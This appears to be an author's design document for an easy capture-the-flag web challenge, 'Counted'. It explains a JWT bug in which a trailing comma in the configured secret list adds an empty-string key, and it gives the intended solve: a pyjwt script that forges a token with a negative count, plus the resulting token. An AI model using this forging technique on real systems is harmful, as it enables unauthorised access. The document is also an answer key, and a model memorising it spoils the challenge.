# Challenge Document


### Version: `0.1.a`
### Long Title: Counted
### Short Title: WEB??
### Author: Isaac (456dev)
### Date: 10/03/2025
### Difficulty: Easy
### Learning objective: Insecure deployment / jwt verification bug


## Challenge Brief (as its to be written in RIO):

Everyone knows that lower numbers are cooler.

Get the flag from the webapp, the Applications source is below


## Solve:

### Automatic:

test script to run against the live service: this makes sure the flag is reachable via the intended solution, automatically

```
flag=example{flag} target=http://localhost:8000 uv run -s test-solve.py
```

Manual / Intended method:

The user must access the /flag endpoint with < 0 "clicks" adding to the counter, which isnt possible in the web app itself
the number of clicks is stored in a signed jwt, following the pattern where multiple jwt secrets can be in use at any 1 time
the application has a bug, where if the python app is passed a jwt secret string including a trailing comma ","
(which this deployment does), then the list of jwts includes an empty string in the last position.
`pyjwt` accepts this both for encoding + decoding, although other libraries may not

to solve:
load the page to get the initial signed jwt cookie
extract the unsigned payload
```json
{
    "count": 0
}
```
(or however may times you clicked first)

modify this payload so that count < 0, and the flag check would pass

```json
{
    "count": -1
}
```

sign this payload with the secret "" (the empty string)

```python
# /// script
# requires-python = ">=3.12"
# dependencies = [
#     "pyjwt",
# ]
# ///
import jwt

payload = {"count": -1}

print(jwt.encode(payload, ""))
```

```bash
$ uv run -s get-jwt.py 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb3VudCI6LTF9.9VBxY0JLEIjg0ihGZ0ZxRIoXT74pCQS7YZbFZsfpRk8
```



## Author Notes: 

since the token doesn't contain a timestamp, generated tokens will not expire

this is a source-available challenge, where you need to find the bug in the input happening.
there is no direct hint that the deployment config contains a trailing "," triggering it, 
but as multiple jwt secrets isnt too common in ctf challenges, it should still point to the right area,
esp with combined by the fact that passing `count < 0` is trivially impossible within the application, where it is either set to 0, or 1 is added,
hinting to the need to modify the cookie.

## Debrief: 



## Hints: 


